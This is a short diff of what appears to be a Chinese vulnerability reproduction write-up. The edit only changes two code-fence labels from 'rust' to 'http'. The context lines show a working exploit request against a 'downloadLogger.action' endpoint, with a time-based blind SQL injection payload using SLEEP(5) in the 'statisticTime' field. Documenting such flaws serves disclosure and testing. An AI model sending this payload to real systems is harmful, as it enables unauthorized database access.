@@ -55,7 +55,7 @@ schema_version: "1"
 
 
 # 四、漏洞复现
-```rust
+```http
 POST /dynamic_monitoring_ledger/complex;downloadLogger.action HTTP/1.1
 Host: 192.168.31.228
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
@@ -69,7 +69,7 @@ statisticTime=1%27+AND+%28SELECT+8849+FROM+%28SELECT%28SLEEP%285%29%29%29uSno%29
 ```
 
 
-```rust
+```http
 POST /dynamic_monitoring_ledger/complex;downloadLogger.action HTTP/1.1
 Host: 192.168.31.228
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
